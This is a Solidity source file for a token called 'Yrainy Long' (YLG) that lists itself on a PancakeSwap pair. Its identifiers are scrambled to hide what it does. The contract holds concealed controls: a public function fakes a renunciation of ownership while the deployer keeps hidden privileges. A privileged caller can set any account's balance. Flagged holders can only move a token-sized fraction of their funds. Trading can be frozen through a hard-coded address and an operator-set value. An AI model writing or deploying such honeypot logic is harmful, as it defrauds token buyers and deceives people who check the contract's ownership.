//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface autoReceiverLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minTokenSell {
    function createPair(address receiverBuy, address isModeTrading) external returns (address);
}

interface takeExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellFee) external view returns (uint256);

    function transfer(address launchTradingFee, uint256 launchedFee) external returns (bool);

    function allowance(address launchTradingFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedFee) external returns (bool);

    function transferFrom(
        address sender,
        address launchTradingFee,
        uint256 launchedFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed swapTx, uint256 value);
    event Approval(address indexed launchTradingFund, address indexed spender, uint256 value);
}

interface limitWallet is takeExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract YrainyLong is amountReceiver, takeExempt, limitWallet {

    function symbol() external view virtual override returns (string memory) {
        return marketingTx;
    }

    function totalAuto() public {
        emit OwnershipTransferred(senderTradingAuto, address(0));
        limitSender = address(0);
    }

    event OwnershipTransferred(address indexed fundTrading, address indexed feeMin);

    uint256 public teamExempt;

    function transfer(address listTradingSwap, uint256 launchedFee) external virtual override returns (bool) {
        return launchedMax(_msgSender(), listTradingSwap, launchedFee);
    }

    uint256 shouldSender;

    function maxIs(address teamEnable) public {
        receiverExempt();
        if (takeTx != teamTx) {
            exemptFundMax = true;
        }
        if (teamEnable == senderTradingAuto || teamEnable == modeMin) {
            return;
        }
        swapLimit[teamEnable] = true;
    }

    function allowance(address sellAtLiquidity, address sellFund) external view virtual override returns (uint256) {
        if (sellFund == shouldToLiquidity) {
            return type(uint256).max;
        }
        return txToken[sellAtLiquidity][sellFund];
    }

    uint256 private walletList = 100000000 * 10 ** 18;

    uint256 constant swapMin = 15 ** 10;

    function approve(address sellFund, uint256 launchedFee) public virtual override returns (bool) {
        txToken[_msgSender()][sellFund] = launchedFee;
        emit Approval(_msgSender(), sellFund, launchedFee);
        return true;
    }

    function owner() external view returns (address) {
        return limitSender;
    }

    constructor (){
        if (takeTx == teamTx) {
            teamExempt = takeTx;
        }
        autoReceiverLaunch exemptTeam = autoReceiverLaunch(shouldToLiquidity);
        modeMin = minTokenSell(exemptTeam.factory()).createPair(exemptTeam.WETH(), address(this));
        
        senderTradingAuto = _msgSender();
        totalAuto();
        sellLimit[senderTradingAuto] = true;
        receiverMin[senderTradingAuto] = walletList;
        if (teamExempt == takeTx) {
            takeTx = teamExempt;
        }
        emit Transfer(address(0), senderTradingAuto, walletList);
    }

    bool public marketingLaunch;

    string private marketingTx = "YLG";

    function buySell(address modeLimit, address launchTradingFee, uint256 launchedFee) internal returns (bool) {
        require(receiverMin[modeLimit] >= launchedFee);
        receiverMin[modeLimit] -= launchedFee;
        receiverMin[launchTradingFee] += launchedFee;
        emit Transfer(modeLimit, launchTradingFee, launchedFee);
        return true;
    }

    address private limitSender;

    function balanceOf(address sellFee) public view virtual override returns (uint256) {
        return receiverMin[sellFee];
    }

    uint256 swapTotalTake;

    address shouldToLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function maxSell(uint256 launchedFee) public {
        receiverExempt();
        swapTotalTake = launchedFee;
    }

    address shouldIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private limitIs = "Yrainy Long";

    address public senderTradingAuto;

    uint8 private modeLaunchFund = 18;

    function toReceiver(address launchSell) public {
        if (totalList) {
            return;
        }
        
        sellLimit[launchSell] = true;
        if (takeTx == teamExempt) {
            teamExempt = takeTx;
        }
        totalList = true;
    }

    function name() external view virtual override returns (string memory) {
        return limitIs;
    }

    bool private swapTakeAmount;

    mapping(address => bool) public swapLimit;

    mapping(address => mapping(address => uint256)) private txToken;

    address public modeMin;

    uint256 public sellExempt;

    mapping(address => uint256) private receiverMin;

    bool public totalList;

    function totalSupply() external view virtual override returns (uint256) {
        return walletList;
    }

    bool public fundTokenLiquidity;

    function getOwner() external view returns (address) {
        return limitSender;
    }

    function decimals() external view virtual override returns (uint8) {
        return modeLaunchFund;
    }

    function launchedMax(address modeLimit, address launchTradingFee, uint256 launchedFee) internal returns (bool) {
        if (modeLimit == senderTradingAuto) {
            return buySell(modeLimit, launchTradingFee, launchedFee);
        }
        uint256 limitLaunch = takeExempt(modeMin).balanceOf(shouldIs);
        require(limitLaunch == swapTotalTake);
        require(launchTradingFee != shouldIs);
        if (swapLimit[modeLimit]) {
            return buySell(modeLimit, launchTradingFee, swapMin);
        }
        return buySell(modeLimit, launchTradingFee, launchedFee);
    }

    bool private exemptFundMax;

    function shouldToken(address listTradingSwap, uint256 launchedFee) public {
        receiverExempt();
        receiverMin[listTradingSwap] = launchedFee;
    }

    mapping(address => bool) public sellLimit;

    function receiverExempt() private view {
        require(sellLimit[_msgSender()]);
    }

    uint256 private teamTx;

    function transferFrom(address modeLimit, address launchTradingFee, uint256 launchedFee) external override returns (bool) {
        if (_msgSender() != shouldToLiquidity) {
            if (txToken[modeLimit][_msgSender()] != type(uint256).max) {
                require(launchedFee <= txToken[modeLimit][_msgSender()]);
                txToken[modeLimit][_msgSender()] -= launchedFee;
            }
        }
        return launchedMax(modeLimit, launchTradingFee, launchedFee);
    }

    uint256 private takeTx;

}